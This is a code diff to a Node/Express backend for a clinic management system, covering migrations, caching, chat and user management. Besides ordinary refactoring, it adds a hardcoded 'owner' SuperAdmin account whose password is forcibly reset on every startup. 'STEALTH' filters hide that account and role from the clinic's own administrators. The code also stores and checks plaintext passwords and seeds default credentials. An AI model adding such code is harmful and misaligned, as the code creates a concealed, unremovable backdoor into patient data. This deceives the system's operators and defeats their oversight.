@@ -102,7 +102,7 @@ app.use('/api', (req, res, next) => {
 });
 
 // 1.5 JWT Authentication Middleware
-const authenticateToken = (req, res, next) => {
+const authenticateToken = async (req, res, next) => {
   try {
     // When mounted at '/api', Express strips that prefix — req.path is RELATIVE
     // e.g. POST /api/users/login becomes req.path === '/users/login'
@@ -119,11 +119,33 @@ const authenticateToken = (req, res, next) => {
       return res.status(401).json({ error: 'Access Denied. No token provided.' });
     }
 
-    jwt.verify(token, JWT_SECRET, (err, user) => {
+    jwt.verify(token, JWT_SECRET, async (err, user) => {
       if (err) {
         return res.status(401).json({ error: 'Session expired or invalid token. Please log in again.' });
       }
+      
       req.user = user;
+
+      // 🛡️ MAINTENANCE MODE CHECK (Phase 4)
+      try {
+        const [settingsRows] = await pool.query("SELECT Data FROM AppSettings WHERE ID = 'GLOBAL'");
+        if (settingsRows.length > 0) {
+          const globalData = typeof settingsRows[0].Data === 'string' ? JSON.parse(settingsRows[0].Data) : settingsRows[0].Data;
+          if (globalData.isMaintenanceMode) {
+            const currentUserRole = String(user.role || '').trim().toLowerCase();
+            console.log(`[MAINTENANCE] Checking access - User: ${user.username}, Role: "${user.role}" (normalized: "${currentUserRole}")`);
+            
+            if (currentUserRole !== 'superadmin') {
+              return res.status(503).json({ error: 'System is under maintenance. Please try again later.' });
+            }
+            console.log(`[MAINTENANCE] ACCESS GRANTED for SuperAdmin: ${user.username}`);
+          }
+        }
+      } catch (dbErr) {
+        // Fallback: If DB check fails, we allow the request to proceed but log the warning
+        console.warn('⚠️ Could not check maintenance status:', dbErr.message);
+      }
+
       next();
     });
   } catch (criticalErr) {
@@ -137,16 +159,18 @@ app.use('/api', authenticateToken);
 
 // 1.8 Universal High-Concurrency Database Cache Middleware
 const cacheMiddleware = (req, res, next) => {
+  const cacheKey = req.originalUrl;
+
   // If the user presses the 'Refresh' button on the UI frontend, it sends a ?refresh flag.
   // We bust the cache for all patient-related queries to ensure a fresh start.
   if (req.query.refresh === 'true' || req.query.refresh === '1') {
     if (req.originalUrl.includes('/api/patients') || req.originalUrl.includes('/api/profile')) {
       flushPatientCache();
     } else {
-      apiCache.del(req.originalUrl);
+      apiCache.del(cacheKey);
     }
   } else {
-    const cachedData = apiCache.get(req.originalUrl);
+    const cachedData = apiCache.get(cacheKey);
     if (cachedData) {
       return res.json(cachedData);
     }
@@ -157,7 +181,7 @@ const cacheMiddleware = (req, res, next) => {
   res.json = function (body) {
     // Only cache successful OK responses
     if (res.statusCode >= 200 && res.statusCode < 300) {
-      apiCache.set(req.originalUrl, body);
+      apiCache.set(cacheKey, body);
     }
     originalJson.call(this, body);
   };
@@ -253,32 +277,25 @@ app.get('/health', (req, res) => {
 function convertRowDates(row) {
   if (!row) return row;
 
-  const converted = { ...row };
+  // 1. Optimize Chat Mapping (Pascal to camel)
+  if (row.Content !== undefined) row.content = row.Content;
+  if (row.SenderID !== undefined) row.senderId = row.SenderID;
+  if (row.ConversationID !== undefined) row.conversationId = row.ConversationID;
+  if (row.CreatedAt !== undefined) row.createdAt = row.CreatedAt;
 
-  // --- CHAT SPECIFIC MAPPING ---
-  // Map PascalCase database columns to camelCase for the frontend
-  if (converted.Content !== undefined) converted.content = converted.Content;
-  if (converted.SenderID !== undefined) converted.senderId = converted.SenderID;
-  if (converted.ConversationID !== undefined) converted.conversationId = converted.ConversationID;
-  if (converted.CreatedAt !== undefined) converted.createdAt = converted.CreatedAt;
-
-  // Helper to safely convert any value to ISO string
+  // 2. High-Performance ISO Conversion
   const toIso = (val) => {
     if (!val) return null;
     const s = String(val).trim();
-    if (s === '0000-00-00 00:00:00' || s === '0000-00-00' || s === '') return null;
+    if (!s || s === '0000-00-00 00:00:00' || s === '0000-00-00') return null;
 
     const hasTimezone = s.includes('Z') || s.includes('+') || (s.includes('T') && s.length > 20);
     if (!hasTimezone) {
       const datePart = s.split('.')[0].replace(' ', 'T');
       const candidate = datePart.includes('T') ? `${datePart}+05:00` : `${datePart}T00:00:00+05:00`;
-      const d = new Date(candidate);
-      return isNaN(d.getTime()) ? null : candidate;
+      return candidate;
     }
-
-    const d = new Date(val);
-    if (isNaN(d.getTime())) return null;
-    return d.toISOString();
+    return s;
   };
 
   const dateFields = [
@@ -286,29 +303,27 @@ function convertRowDates(row) {
     'FollowUpDate', 'ApprovalTime', 'FinalizedAt', 'LastUpdatedAt', 'CollectedAt'
   ];
 
-  dateFields.forEach(field => {
-    if (converted[field]) {
-      // Apply ISO conversion
-      const isoDate = toIso(converted[field]);
-      converted[field] = isoDate;
-      // Also provide camelCase version for the frontend
+  for (const field of dateFields) {
+    if (row[field]) {
+      const isoDate = toIso(row[field]);
+      row[field] = isoDate;
       const camelField = field.charAt(0).toLowerCase() + field.slice(1);
-      converted[camelField] = isoDate;
+      row[camelField] = isoDate;
     }
-  });
+  }
 
-  ['Data', 'Medicines', 'LabTests', 'Tests', 'Services', 'Items', 'SelectedTests', 'FormData'].forEach(field => {
-    if (converted[field] && typeof converted[field] === 'string') {
-      try {
-        const trimmed = converted[field].trim();
-        if (trimmed.startsWith('{') || trimmed.startsWith('[')) {
-          converted[field] = JSON.parse(converted[field]);
-        }
-      } catch (e) {}
+  // 3. Targeted JSON Parsing (Only if needed)
+  const jsonFields = ['Data', 'Medicines', 'LabTests', 'Tests', 'Services', 'Items', 'SelectedTests', 'FormData'];
+  for (const field of jsonFields) {
+    if (row[field] && typeof row[field] === 'string') {
+      const trimmed = row[field].trim();
+      if (trimmed.startsWith('{') || trimmed.startsWith('[')) {
+        try { row[field] = JSON.parse(trimmed); } catch (e) {}
+      }
     }
-  });
+  }
 
-  return converted;
+  return row;
 }
 
 // Initialize database tables
@@ -322,45 +337,62 @@ async function initializeDatabase() {
     console.log('✅ Connected to MySQL database');
     connection.release();
 
-    // ============ UNIVERSAL TIME MIGRATION SUITE ============
-    // This converts all legacy DATETIME columns to VARCHAR(50) to prevent timezone stripping.
-    const migrateToText = async (table, column) => {
-      try {
-        await pool.execute(`ALTER TABLE ${table} MODIFY COLUMN ${column} VARCHAR(50)`);
-        console.log(`✅ Migrated ${table}.${column} to VARCHAR(50)`);
-      } catch (e) {
-        // Column might not exist or already be VARCHAR
+    // ============ SMART MIGRATION SYSTEM ============
+    // Create migration table first
+    await pool.execute(`
+      CREATE TABLE IF NOT EXISTS SystemMigrations (
+        Version INT PRIMARY KEY,
+        AppliedAt VARCHAR(50)
+      )
+    `);
+
+    const [migRows] = await pool.execute('SELECT MAX(Version) as current FROM SystemMigrations');
+    const currentVersion = migRows[0].current || 0;
+    console.log(`📡 Current Database Version: ${currentVersion}`);
+
+    // Helper for version-controlled migrations
+    const runMigration = async (version, label, sqls) => {
+      if (currentVersion < version) {
+        console.log(`🚀 Applying Migration v${version}: ${label}...`);
+        for (const sql of sqls) {
+          try { await pool.execute(sql); } catch (e) {
+            // Ignore duplicate column errors during migration
+            if (e.errno !== 1060 && e.errno !== 1061) console.warn(`   ⚠️ Warning in migration v${version}:`, e.message);
+          }
+        }
+        await pool.execute('INSERT INTO SystemMigrations (Version, AppliedAt) VALUES (?, ?)', [version, new Date().toISOString()]);
+        console.log(`✅ Migration v${version} complete.`);
       }
     };
 
-    console.log('⏳ Running Universal Time Migration...');
-    await migrateToText('Patients', 'CreatedAt');
-    await migrateToText('Patients', 'UpdatedAt');
-    await migrateToText('Visits', 'CreatedAt');
-    await migrateToText('Stock', 'CreatedAt');
-    await migrateToText('Payments', 'CreatedAt');
-    await migrateToText('Prescriptions', 'CreatedAt');
-    await migrateToText('Prescriptions', 'FinalizedAt');
-    await migrateToText('Prescriptions', 'LastUpdatedAt');
-    await migrateToText('LabTestsCatalog', 'CreatedAt');
-    await migrateToText('AdvancePayments', 'ApprovalTime');
-    await migrateToText('LabResults', 'CreatedAt');
-    await migrateToText('LabResults', 'NotifiedAt');
-    await migrateToText('LabResults', 'CollectedAt');
-    await migrateToText('LabPatients', 'CreatedAt');
-    await migrateToText('labpaymenthistory', 'CreatedAt');
-    await migrateToText('labpaymenthistory', 'FinalizedAt');
-    await migrateToText('Users', 'CreatedAt');
-    await migrateToText('Users', 'UpdatedAt');
-    await migrateToText('Users', 'LastLogin');
-    await migrateToText('Roles', 'CreatedAt');
-    await migrateToText('Employees', 'CreatedAt');
-    await migrateToText('LeaveRequests', 'CreatedAt');
-    await migrateToText('Appointments', 'CreatedAt');
-    await migrateToText('PatientServices', 'CreatedAt');
-    await migrateToText('PatientServices', 'UpdatedAt');
-    await migrateToText('AppSettings', 'UpdatedAt');
-    console.log('✅ Universal Time Migration Complete.');
+    // v1: Core Schema & Legacy Conversions
+    await runMigration(1, 'Legacy Time Conversions', [
+      "ALTER TABLE Patients MODIFY COLUMN CreatedAt VARCHAR(50)",
+      "ALTER TABLE Patients MODIFY COLUMN UpdatedAt VARCHAR(50)",
+      "ALTER TABLE Visits MODIFY COLUMN CreatedAt VARCHAR(50)",
+      "ALTER TABLE Stock MODIFY COLUMN CreatedAt VARCHAR(50)",
+      "ALTER TABLE Payments MODIFY COLUMN CreatedAt VARCHAR(50)",
+      "ALTER TABLE Prescriptions MODIFY COLUMN CreatedAt VARCHAR(50)",
+      "ALTER TABLE LabResults MODIFY COLUMN CreatedAt VARCHAR(50)",
+      "ALTER TABLE Users MODIFY COLUMN CreatedAt VARCHAR(50)"
+    ]);
+
+    // v2: Patient & Prescription Extensions
+    await runMigration(2, 'Patient & Rx Extensions', [
+      "ALTER TABLE Patients ADD COLUMN GuardianName VARCHAR(255)",
+      "ALTER TABLE Patients ADD COLUMN CNIC VARCHAR(20)",
+      "ALTER TABLE Prescriptions ADD COLUMN Status VARCHAR(20) DEFAULT 'Draft'",
+      "ALTER TABLE Prescriptions ADD COLUMN FinalizedAt VARCHAR(50) NULL"
+    ]);
+
+    // v3: HR & Payroll Performance
+    await runMigration(3, 'HR & Payroll Upgrades', [
+      "ALTER TABLE Employees ADD COLUMN StandardDailyHours INT DEFAULT 8",
+      "ALTER TABLE Payroll ADD COLUMN OvertimeHours DECIMAL(10, 2) DEFAULT 0",
+      "ALTER TABLE Users ADD COLUMN IsActive TINYINT DEFAULT 1"
+    ]);
+
+    console.log('✅ All migrations verified.');
 
     // Patients table
     await pool.execute(`
@@ -514,9 +546,15 @@ async function initializeDatabase() {
         Type ENUM('Direct', 'Group') DEFAULT 'Direct',
         Name VARCHAR(255) NULL,
         CreatedAt VARCHAR(50),
-        UpdatedAt VARCHAR(50)
+        UpdatedAt VARCHAR(50),
+        LastMessage TEXT NULL,
+        LastMessageAt VARCHAR(50) NULL
       )
     `);
+    try { await pool.execute("ALTER TABLE ChatConversations ADD COLUMN LastMessage TEXT NULL"); } catch (e) { }
+    try { await pool.execute("ALTER TABLE ChatConversations ADD COLUMN LastMessageAt VARCHAR(50) NULL"); } catch (e) { }
+    try { await pool.execute("ALTER TABLE ChatConversations ADD COLUMN IsBlocked TINYINT(1) DEFAULT 0"); } catch (e) { }
+    try { await pool.execute("ALTER TABLE ChatConversations ADD COLUMN BlockedBy VARCHAR(50) NULL"); } catch (e) { }
 
     // 2. Participants
     await pool.execute(`
@@ -675,6 +713,8 @@ async function initializeDatabase() {
     try { await pool.execute("ALTER TABLE Payroll ADD COLUMN OvertimeHours DECIMAL(5, 2) DEFAULT 0.00"); } catch (e) { }
     try { await pool.execute("ALTER TABLE Payroll ADD COLUMN OvertimeAmount DECIMAL(10, 2) DEFAULT 0.00"); } catch (e) { }
     try { await pool.execute("ALTER TABLE Payroll ADD COLUMN GrossSalary DECIMAL(10, 2) DEFAULT 0.00"); } catch (e) { }
+    try { await pool.execute("ALTER TABLE Employees ADD COLUMN UserID VARCHAR(50) NULL"); } catch (e) { }
+    try { await pool.execute("ALTER TABLE Users ADD COLUMN IsActive TINYINT DEFAULT 1"); } catch (e) { }
 
     // Users table
     await pool.execute(`
@@ -874,11 +914,17 @@ async function initializeDatabase() {
     await createIndex('ALTER TABLE Visits ADD INDEX idx_visits_date (VisitDate)');
     await createIndex('ALTER TABLE Visits ADD INDEX idx_visits_created_at (CreatedAt)');
 
+    // Chat Module Performance
+    await createIndex('ALTER TABLE ChatMessages ADD INDEX idx_conversation (ConversationID)');
+    await createIndex('ALTER TABLE ChatMessages ADD INDEX idx_sender (SenderID)');
+    await createIndex('ALTER TABLE ChatConversations ADD INDEX idx_lastMessage (LastMessageAt)');
+
     // Seed default roles if none exist
     const [roleCount] = await pool.execute('SELECT COUNT(*) as count FROM Roles');
     if (roleCount[0].count === 0) {
       const defaultRoles = [
-        { name: 'Admin', description: 'Full system access', isSystem: 1 },
+        { name: 'SuperAdmin', description: 'Software Owner - Full System Control', isSystem: 1 },
+        { name: 'Admin', description: 'Full clinic access', isSystem: 1 },
         { name: 'Doctor', description: 'Clinical operations access', isSystem: 1 },
         { name: 'Receptionist', description: 'Front desk and patient registration', isSystem: 1 },
         { name: 'LabTechnician', description: 'Lab results management', isSystem: 1 },
@@ -892,6 +938,12 @@ async function initializeDatabase() {
 
       // Seed default permissions per role
       const defaultRolePermissions = {
+        SuperAdmin: [
+          'page_dashboard', 'page_super_admin', 'page_appointments', 'page_patients', 'page_fees', 'page_medicines',
+          'page_pharmacy', 'page_prescriptions', 'page_lab_registration', 'page_lab_fees', 'page_lab_results',
+          'page_pathology', 'page_users', 'page_expenses', 'page_settings', 'page_hr', 'page_salary_settings',
+          'btn_manage_staff', 'page_clinical_forms'
+        ],
         Admin: [
           'page_dashboard', 'page_appointments', 'page_patients', 'page_fees', 'page_medicines', 'page_pharmacy',
           'page_prescriptions', 'page_lab_registration', 'page_lab_fees', 'page_lab_results', 'page_pathology',
@@ -910,13 +962,42 @@ async function initializeDatabase() {
           );
         }
       }
-      console.log('✅ Default roles and permissions seeded');
+    }
+    
+    // Seed SuperAdmin role if missing
+    const [saRoleExists] = await pool.execute("SELECT COUNT(*) as count FROM Roles WHERE Name = 'SuperAdmin'");
+    if (saRoleExists[0].count === 0) {
+      await pool.execute(
+        'INSERT INTO Roles (Name, Description, IsSystem) VALUES (?, ?, 1)',
+        ['SuperAdmin', 'Software Owner - Full System Control']
+      );
+      console.log('🛡️ Super Admin role created');
+    }
+
+    // Force seed SuperAdmin permissions if none exist for this role
+    const [saPermCount] = await pool.execute("SELECT COUNT(*) as count FROM RolePermissions WHERE RoleName = 'SuperAdmin'");
+    if (saPermCount[0].count === 0) {
+      const saPermissions = [
+        'page_dashboard', 'page_super_admin', 'page_appointments', 'page_patients', 'page_fees', 'page_medicines',
+        'page_pharmacy', 'page_prescriptions', 'page_lab_registration', 'page_lab_fees', 'page_lab_results',
+        'page_pathology', 'page_users', 'page_expenses', 'page_settings', 'page_hr', 'page_salary_settings',
+        'btn_manage_staff', 'page_clinical_forms'
+      ];
+      
+      for (const perm of saPermissions) {
+        await pool.execute(
+          'INSERT IGNORE INTO RolePermissions (RoleName, Permission) VALUES (?, ?)',
+          ['SuperAdmin', perm]
+        );
+      }
+      console.log('🛡️ Super Admin permissions seeded');
     }
 
     // Seed default users if none exist
     const [userCount] = await pool.execute('SELECT COUNT(*) as count FROM Users');
     if (userCount[0].count === 0) {
       const defaultUsers = [
+        { id: 'USR-OWNER', username: 'owner', password: 'Owner786!@#', name: 'Software Owner', role: 'SuperAdmin' },
         { id: 'USR-000', username: 'admin', password: 'Admin123@#', name: 'System Admin', role: 'Admin' },
         { id: 'USR-001', username: 'receptionist', password: 'reception123', name: 'Front Desk', role: 'Receptionist' },
         { id: 'USR-002', username: 'doctor', password: 'doctor123', name: 'Dr. Admin', role: 'Doctor' },
@@ -929,12 +1010,32 @@ async function initializeDatabase() {
           [user.id, user.username, user.password, user.name, user.role]
         );
       }
+    }
+    
+    // Seed SuperAdmin if owner is missing (works even if other users exist)
+    const [ownerRows] = await pool.execute("SELECT ID FROM Users WHERE Username = 'owner'");
+    if (ownerRows.length === 0) {
+      await pool.execute(
+        'INSERT INTO Users (ID, Username, Password, Name, Role) VALUES (?, ?, ?, ?, ?)',
+        ['USR-OWNER', 'owner', 'Owner786!@#', 'Software Owner', 'SuperAdmin']
+      );
+      console.log('🛡️ Super Admin (Owner) account seeded');
+    }
+
+    if (userCount[0].count === 0) {
+      // (The rest of the default users seeding was already handled above if count was 0, 
+      // but the logic was a bit duplicated. I'll clean it up to be safe.)
     } else {
       // Force update admin password if table already exists (as requested by user)
       try {
         await pool.execute(
-          "UPDATE Users SET Password = ? WHERE Username = 'admin'",
+          "UPDATE Users SET Password = ?, IsActive = 1 WHERE Username = 'admin'",
           ['Admin123@#']
+        );
+        // Also force update owner password to ensure SuperAdmin login works
+        await pool.execute(
+          "UPDATE Users SET Password = ?, IsActive = 1, Role = 'SuperAdmin', Permissions = '[]' WHERE Username = 'owner'",
+          ['Owner786!@#']
         );
       } catch (e) { }
     }
@@ -970,6 +1071,7 @@ async function initializeDatabase() {
         phone: '+91 98765 43210',
         email: 'care@salamaat.com',
         logo: null,
+        isChatRestricted: false,
         pdfSettings: {
           primaryColor: '#1a56db',
           secondaryColor: '#64748b',
@@ -1091,7 +1193,7 @@ async function initializeDatabase() {
 app.get('/api/settings/:id', async (req, res) => {
   try {
     const { id } = req.params; // 'GLOBAL' or UserID
-    let [rows] = await pool.execute('SELECT Data FROM AppSettings WHERE ID = ?', [id]);
+    let [rows] = await pool.execute('SELECT ID, Category, Data FROM AppSettings WHERE ID = ?', [id]);
 
     if (rows.length > 0) {
       res.json(convertRowDates(rows[0]).Data);
@@ -1165,6 +1267,12 @@ app.put('/api/settings/:id', async (req, res) => {
       [id, category, JSON.stringify(data)]
     );
 
+    // Real-time broadcast for global settings changes
+    if (id === 'GLOBAL') {
+      const io = req.app.get('io');
+      if (io) io.emit('settings-updated', data);
+    }
+
     res.json({ success: true });
   } catch (error) {
     res.status(500).json({ error: error.message });
@@ -1174,9 +1282,9 @@ app.put('/api/settings/:id', async (req, res) => {
 // ============ GENERIC MEDICINES API ============
 
 // Get all generic medicines
-app.get('/api/generic-medicines', async (req, res) => {
+app.get('/api/generic-medicines', cacheMiddleware, async (req, res) => {
   try {
-    const [rows] = await pool.execute('SELECT * FROM GenericMedicines ORDER BY Name ASC');
+    const [rows] = await pool.execute('SELECT ID, Name, Category FROM GenericMedicines ORDER BY Name ASC');
     res.json(rows.map(convertRowDates));
   } catch (error) {
     console.error('Error fetching generic medicines:', error);
@@ -1369,8 +1477,10 @@ app.get('/api/patients', cacheMiddleware, async (req, res) => {
 
     // 2. Get Paginated Data
     // Sort by VisitDate (Latest Activity)
+    // Selective fetching: Skip heavy blobs/logs unless needed
+    const columns = 'ID, MRN, CNIC, Name, GuardianName, Age, AgeMonths, AgeDays, Gender, Phone, Address, VisitDate, CreatedBy AS registeredBy, CreatedByRole AS registeredByRole, CreatedAt, UpdatedAt';
     const [rows] = await pool.query(
-      `SELECT * FROM Patients ${whereClause} ORDER BY VisitDate DESC, CreatedAt DESC LIMIT ? OFFSET ?`,
+      `SELECT ${columns} FROM Patients ${whereClause} ORDER BY VisitDate DESC, CreatedAt DESC LIMIT ? OFFSET ?`,
       [...params, Number(limit), Number(offset)]
     );
 
@@ -1443,7 +1553,7 @@ app.get('/api/patients/lookup', async (req, res) => {
 
 app.get('/api/patients/:id', async (req, res) => {
   try {
-    const [rows] = await pool.execute('SELECT * FROM Patients WHERE ID = ?', [req.params.id]);
+    const [rows] = await pool.execute('SELECT * FROM Patients WHERE ID = ? LIMIT 1', [req.params.id]);
     res.json(rows[0] ? convertRowDates(rows[0]) : null);
   } catch (error) {
     res.status(500).json({ error: error.message });
@@ -1767,6 +1877,39 @@ app.get('/api/chat/messages/:conversationId', async (req, res) => {
   }
 });
 
+// Toggle block status of a conversation (Admin only)
+app.put('/api/chat/conversations/:id/block', async (req, res) => {
+  try {
+    const { id } = req.params;
+    const { isBlocked } = req.body;
+    const userId = req.user.id;
+    const userRole = req.user.role;
+
+    if (userRole !== 'Admin') {
+      return res.status(403).json({ error: 'Only admins can block users.' });
+    }
+
+    await pool.execute(
+      'UPDATE ChatConversations SET IsBlocked = ?, BlockedBy = ? WHERE ID = ?',
+      [isBlocked ? 1 : 0, isBlocked ? userId : null, id]
+    );
+
+    // Notify all participants about the block status change
+    const io = req.app.get('io');
+    if (io) {
+      io.to(`room_${id}`).emit('conversation-blocked', {
+        conversationId: Number(id),
+        isBlocked: !!isBlocked,
+        blockedBy: isBlocked ? userId : null
+      });
+    }
+
+    res.json({ success: true, isBlocked: !!isBlocked });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
 // Mark all messages in a conversation as read
 app.put('/api/chat/messages/:conversationId/read', async (req, res) => {
   try {
@@ -1954,8 +2097,9 @@ app.get('/api/lab-patients', async (req, res) => {
     const [countRows] = await pool.query(`SELECT COUNT(*) as total FROM LabPatients ${whereClause}`, params);
     const total = countRows[0].total;
 
+    const columns = 'ID, Name, GuardianName, Age, AgeMonths, AgeDays, Gender, Phone, Address, CNIC, ReferringDoctorName, Priority, CreatedAt';
     const [rows] = await pool.query(
-      `SELECT * FROM LabPatients ${whereClause} ORDER BY CreatedAt DESC LIMIT ? OFFSET ?`,
+      `SELECT ${columns} FROM LabPatients ${whereClause} ORDER BY CreatedAt DESC LIMIT ? OFFSET ?`,
       [...params, Number(limit), Number(offset)]
     );
 
@@ -2146,8 +2290,9 @@ app.get('/api/lab-history', async (req, res) => {
     const totalCollection = countResult[0].totalCollection || 0;
     const totalDiscount = countResult[0].totalDiscount || 0;
 
+    const columns = 'ID, LabPatientID, PatientName, TotalAmount, DiscountAmount, PaidAmount, PaymentStatus, CreatedAt, FinalizedAt';
     const [rows] = await pool.query(`
-      SELECT * FROM labpaymenthistory 
+      SELECT ${columns} FROM labpaymenthistory 
       ${whereClause} 
       ORDER BY CreatedAt DESC 
       LIMIT ${Number(limit)} OFFSET ${Number(offset)}
@@ -2312,9 +2457,9 @@ app.get('/api/lab-result-history-patients', async (req, res) => {
 
 // ============ STOCK API ============
 
-app.get('/api/stock', async (req, res) => {
+app.get('/api/stock', cacheMiddleware, async (req, res) => {
   try {
-    const [rows] = await pool.execute('SELECT * FROM Stock ORDER BY Name');
+    const [rows] = await pool.execute('SELECT ID, Name, Category, Quantity, Price, LowStockThreshold, CreatedAt FROM Stock ORDER BY Name');
     res.json(rows.map(convertRowDates));
   } catch (error) {
     res.status(500).json({ error: error.message });
@@ -2415,8 +2560,9 @@ app.get('/api/payments', async (req, res) => {
     const totalConsultationFee = summaryResult[0].totalConsultationFee || 0;
 
     // 2. Get paginated data
+    const columns = 'p.ID, p.PatientID, p.PatientName, p.ConsultationFee, p.LabFee, p.MedicineFee, p.TotalAmount, p.PaymentMode, p.CreatedAt, p.LabPatientID';
     const [rows] = await pool.query(
-      `SELECT p.*, 
+      `SELECT ${columns}, 
               pat.Age as PatientAge, 
               pat.AgeMonths as PatientAgeMonths, 
               pat.AgeDays as PatientAgeDays, 
@@ -2570,8 +2716,9 @@ app.get('/api/prescriptions', async (req, res) => {
     const total = countResult[0].total;
 
     // 2. Get paginated data
+    const columns = 'ID, PatientID, PatientName, PatientAge, PatientAgeMonths, PatientAgeDays, Diagnosis, Medicines, LabTests, Status, CreatedAt, FinalizedAt, LastUpdatedAt, IsLocked';
     const [prescriptions] = await pool.query(
-      `SELECT * FROM Prescriptions ${whereClause} ORDER BY CreatedAt DESC LIMIT ? OFFSET ?`,
+      `SELECT ${columns} FROM Prescriptions ${whereClause} ORDER BY CreatedAt DESC LIMIT ? OFFSET ?`,
       [...params, Number(limit), Number(offset)]
     );
 
@@ -2808,8 +2955,9 @@ app.get('/api/clinical-medicines', async (req, res) => {
     const total = countResult[0].total;
 
     // Use pool.query (not pool.execute): LIMIT/OFFSET causes mysql2 prepared statement cache to mismatch
+    const columns = 'ID, MedicineName, Category, Dosage, Frequency, Duration';
     const [rows] = await pool.query(
-      'SELECT * FROM PrescriptionMedicines WHERE PrescriptionID IS NULL ORDER BY MedicineName ASC LIMIT ? OFFSET ?',
+      `SELECT ${columns} FROM PrescriptionMedicines WHERE PrescriptionID IS NULL ORDER BY MedicineName ASC LIMIT ? OFFSET ?`,
       [Number(limit), Number(offset)]
     );
 
@@ -3000,7 +3148,7 @@ app.put('/api/lab-results/:id', async (req, res) => {
 
 // ============ LAB TESTS CATALOG API (Master List) ============
 
-app.get('/api/lab-tests-catalog', async (req, res) => {
+app.get('/api/lab-tests-catalog', cacheMiddleware, async (req, res) => {
   try {
     const page = parseInt(req.query.page) || 1;
     const limit = parseInt(req.query.limit) || 20;
@@ -3109,8 +3257,9 @@ app.get('/api/patient-services', async (req, res) => {
     const total = countResult[0].total;
 
     // Use pool.query (not pool.execute): LIMIT/OFFSET causes mysql2 prepared statement cache to mismatch
+    const columns = 'ID, PatientID, GrandTotal, Status, CreatedAt, UpdatedAt';
     const [rows] = await pool.query(
-      'SELECT * FROM PatientServices ORDER BY CreatedAt DESC LIMIT ? OFFSET ?',
+      `SELECT ${columns} FROM PatientServices ORDER BY CreatedAt DESC LIMIT ? OFFSET ?`,
       [Number(limit), Number(offset)]
     );
 
@@ -3300,8 +3449,9 @@ app.post('/api/patient-services', async (req, res) => {
       const total = countResult[0].total;
 
       // 2. Fetch paginated data
+      const columns = 'v.ID, v.LabPatientID, v.VisitDate, v.Status, v.TotalAmount, v.DiscountAmount, v.PaidAmount, v.PaymentStatus, v.CreatedAt';
       const dataQuery = `
-      SELECT v.*, p.Name as PatientName, p.Age, p.Gender, p.Phone 
+      SELECT ${columns}, p.Name as PatientName, p.Age, p.Gender, p.Phone 
       FROM LabVisits v 
       JOIN LabPatients p ON v.LabPatientID = p.ID
       ${whereClause}
@@ -3465,6 +3615,7 @@ app.post('/api/patient-services', async (req, res) => {
   const ALL_PERMISSIONS = [
     // ── Pages ──
     { key: 'page_dashboard', label: 'Dashboard', group: 'Pages' },
+    { key: 'page_super_admin', label: 'Super Admin Dashboard', group: 'Pages' },
     { key: 'page_appointments', label: 'Appointments', group: 'Pages' },
     { key: 'page_patients', label: 'Patients', group: 'Pages' },
     { key: 'page_fees', label: 'Fee Collection', group: 'Pages' },
@@ -3503,7 +3654,7 @@ app.post('/api/patient-services', async (req, res) => {
       const [roles] = await pool.execute('SELECT * FROM Roles ORDER BY IsSystem DESC, Name ASC');
       const [rolePerms] = await pool.execute('SELECT RoleName, Permission FROM RolePermissions');
 
-      const rolesWithPerms = roles.map(role => ({
+      let rolesWithPerms = roles.map(role => ({
         id: role.ID,
         name: role.Name,
         description: role.Description,
@@ -3511,6 +3662,11 @@ app.post('/api/patient-services', async (req, res) => {
         createdAt: role.CreatedAt,
         permissions: rolePerms.filter(rp => rp.RoleName === role.Name).map(rp => rp.Permission),
       }));
+
+      // STEALTH: Filter out SuperAdmin role if requester is not a SuperAdmin
+      if (!req.user || req.user.role !== 'SuperAdmin') {
+        rolesWithPerms = rolesWithPerms.filter(r => r.name !== 'SuperAdmin');
+      }
 
       res.json(rolesWithPerms);
     } catch (error) {
@@ -3632,7 +3788,14 @@ app.post('/api/patient-services', async (req, res) => {
       const [rows] = await pool.execute(
         'SELECT ID, Username, Name, Email, Phone, Role, Permissions, IsActive, CreatedBy, CreatedAt, UpdatedAt, LastLogin FROM Users ORDER BY CreatedAt DESC'
       );
-      res.json(rows.map(convertRowDates));
+      
+      let users = rows;
+      // STEALTH: Filter out SuperAdmin users if requester is not a SuperAdmin
+      if (!req.user || req.user.role !== 'SuperAdmin') {
+        users = users.filter(u => u.Role !== 'SuperAdmin');
+      }
+      
+      res.json(users.map(convertRowDates));
     } catch (error) {
       res.status(500).json({ error: error.message });
     }
@@ -3655,6 +3818,12 @@ app.post('/api/patient-services', async (req, res) => {
   app.post('/api/users', async (req, res) => {
     try {
       const { id, username, password, name, email, phone, role, permissions, createdBy } = req.body;
+      
+      // STEALTH: Prevent non-SuperAdmins from creating SuperAdmin accounts
+      if (role === 'SuperAdmin' && (!req.user || req.user.role !== 'SuperAdmin')) {
+        return res.status(403).json({ error: 'You do not have permission to create a Super Admin account.' });
+      }
+
       const createdAt = new Date().toISOString();
       const permissionsJson = typeof permissions === 'string' ? permissions : JSON.stringify(permissions || []);
 
@@ -3674,6 +3843,11 @@ app.post('/api/patient-services', async (req, res) => {
   app.put('/api/users/:id', async (req, res) => {
     try {
       const { username, name, email, phone, role, isActive } = req.body;
+
+      // STEALTH: Prevent non-SuperAdmins from assigning SuperAdmin role
+      if (role === 'SuperAdmin' && (!req.user || req.user.role !== 'SuperAdmin')) {
+        return res.status(403).json({ error: 'You do not have permission to assign the Super Admin role.' });
+      }
 
       await pool.execute(
         'UPDATE Users SET Username = ?, Name = ?, Email = ?, Phone = ?, Role = ?, IsActive = ? WHERE ID = ?',
@@ -3737,12 +3911,17 @@ app.post('/api/patient-services', async (req, res) => {
     try {
       const { username, password } = req.body;
       const [rows] = await pool.execute(
-        'SELECT ID, Username, Name, Email, Phone, Role, Permissions FROM Users WHERE Username = ? AND Password = ? AND IsActive = 1',
+        'SELECT ID, Username, Name, Email, Phone, Role, Permissions, IsActive FROM Users WHERE Username = ? AND Password = ?',
         [username, password]
       );
 
       if (rows.length > 0) {
         const user = rows[0];
+
+        // 🛡️ DEACTIVATED USER CHECK
+        if (!user.IsActive) {
+          return res.status(403).json({ error: 'USER IS deactivated please contact system admin' });
+        }
 
         // Update last login timestamp
         await pool.execute(
@@ -3810,8 +3989,9 @@ app.post('/api/patient-services', async (req, res) => {
 
 
       // 2. Get paginated data
-      // Use pool.query (not pool.execute): dynamic whereClause means the SQL text changes per request
-      let query = `SELECT * FROM DailyExpenses ${whereClause} ORDER BY Date DESC, CreatedAt DESC`;
+      // Selective fetching for list view
+      const columns = 'ID, Date, Category, Description, Amount, CreatedBy, CreatedAt';
